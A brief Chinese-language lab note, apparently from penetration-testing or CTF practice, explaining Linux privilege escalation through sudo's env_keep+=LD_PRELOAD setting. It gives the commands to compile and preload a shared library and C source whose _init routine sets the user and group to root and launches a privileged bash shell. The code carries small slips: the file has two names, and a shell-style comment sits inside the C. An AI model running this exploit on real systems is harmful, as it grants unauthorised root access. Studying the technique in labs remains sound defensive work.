`env_keep+=LD_PRELOAD`是指在使用`sudo`命令时，环境变量`LD_PRELOAD`将保持不变。`LD_PRELOAD`是一个环境变量，它允许用户在程序加载时预先加载指定的共享库。

因此，可以把提权的代码写入共享库中，使用不需要密码的命令预加载这个共享库实现提权。

当前靶机可以执行什么系统命令，sudo环境变量设置是什么

```bash
sudo -l
# env_rest, env_keep+=LD_PRELOAD
# (root) NOPASSWD: /binfile
gcc -fPIC -shared -nostartfiles -o shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so /binfile
```

```bash
# file: pri.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

// filename: shell.c
// define a shared object
void _init() {
	unsetenv("LD_PRELOAD"); # once is enough
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
}
```